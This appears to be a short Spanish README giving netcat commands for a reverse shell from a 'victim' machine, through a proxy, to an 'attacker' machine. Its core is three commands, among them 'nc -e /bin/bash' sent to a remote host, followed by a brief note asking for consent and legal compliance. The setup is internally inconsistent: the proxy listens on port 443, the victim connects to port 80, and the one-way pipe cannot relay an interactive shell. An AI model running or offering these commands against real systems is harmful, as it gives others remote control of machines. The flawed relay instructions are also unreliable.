# README - Conexión de Shell Inversa a través de Proxy
Este README proporciona una descripción general de la configuración necesaria para establecer una conexión de shell inversa desde una máquina víctima a través de un proxy hacia una máquina atacante.

# Descripción del Escenario
En este escenario, hemos configurado una conexión de shell inversa a través de un proxy utilizando netcat (nc). La configuración implica tres máquinas:

- Máquina Atacante (Attacker): La máquina desde la que se inicia la conexión de shell inversa.
- Proxy: El intermediario que redirige el tráfico entre la máquina víctima y la máquina atacante.
- Máquina Víctima (Victim): La máquina que envía la conexión de shell inversa a través del proxy.

# Configuración

Máquina Atacante (Attacker)
Ejecutar el siguiente comando para escuchar la conexión entrante:

nc -lvp 443

# Proxy
Ejecutar el siguiente comando para redirigir el tráfico entrante al puerto 443 de la máquina atacante:

nc -lvp 443 | nc [IP de la máquina atacante] 443

# Máquina Víctima (Victim)
Ejecutar el siguiente comando para enviar una shell inversa al proxy en el puerto 80 (simulando una conexión HTTP):

nc -e /bin/bash [IP del proxy] 80

# Consideraciones Importantes
Asegúrate de tener los permisos adecuados y el consentimiento del propietario del sistema antes de realizar estas acciones.
Las direcciones IP y los puertos mencionados en este README son ejemplos y deben reemplazarse por las direcciones IP y puertos reales de tu configuración.
Es fundamental respetar las leyes y regulaciones locales relacionadas con la seguridad informática y la privacidad.
